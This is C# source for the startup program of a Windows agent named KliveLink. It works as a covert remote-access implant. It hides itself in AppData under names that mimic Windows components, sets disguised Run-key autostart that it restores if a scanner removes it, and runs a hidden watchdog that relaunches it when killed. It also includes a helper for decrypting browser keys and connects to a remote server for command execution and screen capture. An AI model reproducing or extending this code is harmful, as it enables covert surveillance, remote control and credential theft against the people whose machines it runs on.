using System.Drawing;
using KliveLink.Agent;
using KliveLink.Agent.V2;
using KliveLink.Contracts;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace KliveLink
{

    internal static class Program
    {
        private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
        private const string MutexName = "Global\\SysMonWatchdog";
        private static NotifyIcon? _trayIcon = null;
        private static KliveLinkClient? _client;
        private static KliveLinkV2Client? _v2Client;

        [STAThread]
        static void Main(string[] args)
        {
            // App-bound browser keys must be decrypted from inside the browser's
            // installation path. The agent invokes itself through a hard link there.
            if (args.Contains("--abe-helper"))
            {
                Environment.ExitCode = AbeHelper.Run(args);
                return;
            }

            // If launched with --watchdog, run as a watchdog that restarts the main process
            if (args.Contains("--watchdog"))
            {
                RunWatchdog(args.Where(a => a != "--watchdog").ToArray());
                return;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            bool alreadyInstalled = args.Any(a => a.Equals("--installed", StringComparison.OrdinalIgnoreCase));

            // Move app to AppData and set auto-start if first launch
            string currentPath = Environment.ProcessPath!;
            if (alreadyInstalled && IsPersistentInstallPath(currentPath))
                EnsureRunKey(currentPath);
            string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysMon");
            string targetPath = Path.Combine(targetDir, Path.GetFileName(currentPath));
            if (!alreadyInstalled && currentPath != targetPath)
            {
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                string sourceDir = Path.GetDirectoryName(currentPath) ?? targetDir;
                string baseName = Path.GetFileNameWithoutExtension(currentPath);
                foreach (string file in Directory.GetFiles(sourceDir))
                {
                    string fileName = Path.GetFileName(file);
                    if (!fileName.StartsWith("KliveLink", StringComparison.OrdinalIgnoreCase) &&
                        !fileName.StartsWith(baseName, StringComparison.OrdinalIgnoreCase) &&
                        !fileName.Equals("klive.config.json", StringComparison.OrdinalIgnoreCase)) continue;
                    string destFile = Path.Combine(targetDir, fileName);
                    File.Copy(file, destFile, true);
                }
                // Set auto-start
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("KL", targetPath);
                    }
                }
                // Launch new instance invisibly
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    Arguments = string.Join(" ", args.Select(arg => $"\"{arg}\"")),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return;
            }

            // Launch watchdog process to restart us if killed
            StartWatchdog(args);

            // Parse arguments
            V2Config? v2Config = V2Config.TryLoad();
            bool useV2 = args.Any(a => a.Equals("--v2", StringComparison.OrdinalIgnoreCase)) ||
                         (v2Config != null && !args.Any(a => a.Equals("--v1", StringComparison.OrdinalIgnoreCase)));
            string serverUri = "";
            string authToken = "";
            string? explicitAgentId = null;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--v2":
                        useV2 = true;
                        break;
                    case "--v1":
                        useV2 = false;
                        break;
                    case "--server" when i + 1 < args.Length:
                        serverUri = args[++i];
                        break;
                    case "--token" when i + 1 < args.Length:
                        authToken = args[++i];
                        break;
                    case "--agentid" when i + 1 < args.Length:
                        explicitAgentId = args[++i];
                        break;
                }
            }

            if (string.IsNullOrWhiteSpace(serverUri))
                serverUri = useV2 ? (v2Config?.Server ?? "wss://klive.dev/klivelink/v2/ws") : DefaultServerUri;
            if (useV2 && string.IsNullOrWhiteSpace(authToken)) authToken = v2Config?.Token ?? "dev-token";
            string agentId = useV2
                ? V2Identity.GetOrCreate(explicitAgentId ?? v2Config?.AgentId)
                : explicitAgentId ?? (Environment.MachineName + "-" + Environment.UserName);

            var cts = new CancellationTokenSource();
            if (useV2)
            {
                var dispatcher = new V2CommandDispatcher(agentId);
                var v2Screen = new ScreenCaptureService();
                V2CollectionTier autoTier = V2CollectionTier.T1;
                if (!string.IsNullOrWhiteSpace(v2Config?.AutoTier) &&
                    Enum.TryParse(v2Config.AutoTier, true, out V2CollectionTier configuredTier))
                    autoTier = configuredTier;
                _v2Client = new KliveLinkV2Client(serverUri, agentId, authToken, dispatcher, v2Screen, v2Config?.PinSha256, autoTier);
                _v2Client.OnLog += (msg) => Console.WriteLine(msg);
                _ = Task.Run(() => _v2Client.ConnectAsync(cts.Token));
            }
            else
            {
                var executor = new CommandExecutor();
                var screenCapture = new ScreenCaptureService();
                _client = new KliveLinkClient(serverUri, agentId, authToken, executor, screenCapture);
                _client.OnLog += (msg) => Console.WriteLine(msg);
                _ = Task.Run(() => _client.ConnectAsync(cts.Token));
            }

            // Step 4: Run the WinForms message loop (keeps tray icon alive)
            Application.Run();

            // Cleanup
            cts.Cancel();
            _client?.Dispose();
            _v2Client?.Dispose();
            _trayIcon?.Dispose();
        }

        private static bool IsPersistentInstallPath(string path)
        {
            try
            {
                string full = Path.GetFullPath(path);
                string programData = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                    "WindowsCacheHost");
                string caches = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft", "Windows", "Caches", "kl");
                return full.StartsWith(programData + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase) ||
                       full.StartsWith(caches + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase);
            }
            catch { return false; }
        }

        /// <summary>
        /// Re-asserts the per-user Run value every time an installed agent starts. This
        /// repairs autostart if the installer could not write it, or if a scanner removed it.
        /// </summary>
        private static void EnsureRunKey(string exePath)
        {
            try
            {
                using RegistryKey? key = Registry.CurrentUser.CreateSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (key == null) return;
                string desired = $"\"{exePath}\" --installed";
                if (key.GetValue("WindowsCacheHost") as string != desired)
                    key.SetValue("WindowsCacheHost", desired, RegistryValueKind.String);
            }
            catch { }
        }

        /// <summary>
        /// Launches a separate copy of this exe as a watchdog process.
        /// The watchdog monitors the main process and restarts it if terminated.
        /// </summary>
        private static void StartWatchdog(string[] args)
        {
            try
            {
                string exePath = Environment.ProcessPath!;
                string watchdogArgs = "--watchdog " + string.Join(" ", args.Select(a => $"\"{a}\""));
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = watchdogArgs,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }

        /// <summary>
        /// Watchdog mode: monitors the main process and restarts it if killed.
        /// Uses a mutex to ensure only one watchdog runs at a time.
        /// </summary>
        private static void RunWatchdog(string[] args)
        {
            using var mutex = new Mutex(true, MutexName, out bool createdNew);
            if (!createdNew)
                return; // Another watchdog is already running

            string exePath = Environment.ProcessPath!;
            string mainArgs = string.Join(" ", args.Select(a => $"\"{a}\""));

            while (true)
            {
                // Find the main process (same exe, without --watchdog)
                var current = Process.GetCurrentProcess();
                var mainProcess = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(exePath))
                    .FirstOrDefault(p => p.Id != current.Id);

                if (mainProcess == null)
                {
                    // Main process is gone — restart it
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = exePath,
                            Arguments = mainArgs,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                    catch { }

                    // Wait for it to start
                    Thread.Sleep(3000);
                }
                else
                {
                    try
                    {
                        mainProcess.WaitForExit(5000);
                    }
                    catch { }
                }
            }
        }
    }
}
